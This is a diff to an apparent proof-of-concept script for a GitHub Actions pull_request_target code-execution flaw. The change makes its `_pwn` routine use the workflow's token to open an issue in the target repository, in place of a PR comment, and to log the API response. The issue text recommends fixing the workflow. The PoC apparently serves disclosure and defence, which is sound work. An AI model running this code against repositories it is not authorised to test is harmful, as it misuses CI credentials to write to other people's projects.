@@ -69,10 +69,14 @@ def _pwn():
         "job that never touches secrets, and keep a privileged comment-only "
         "job that consumes the build's artifact."
     )
-    url = f"https://api.github.com/repos/{repo}/issues/{pr_num}/comments"
+    url = f"https://api.github.com/repos/{repo}/issues"
+    payload = {
+        "title": f"PoC: pull_request_target RCE (triggered by PR #{pr_num})",
+        "body": body,
+    }
     req = urllib.request.Request(
         url,
-        data=json.dumps({"body": body}).encode(),
+        data=json.dumps(payload).encode(),
         method="POST",
         headers={
             "Authorization": f"token {token}",
@@ -80,8 +84,13 @@ def _pwn():
             "User-Agent": "prt-poc",
         },
     )
-    with urllib.request.urlopen(req, timeout=15) as r:
-        _log(f"comment POST status={r.status}")
+    try:
+        with urllib.request.urlopen(req, timeout=15) as r:
+            issue = json.load(r)
+            _log(f"issue POST status={r.status} number=#{issue['number']} "
+                 f"url={issue['html_url']}")
+    except urllib.error.HTTPError as e:
+        _log(f"issue POST HTTP {e.code}: {e.read().decode('utf-8', 'replace')}")
 
 
 try:
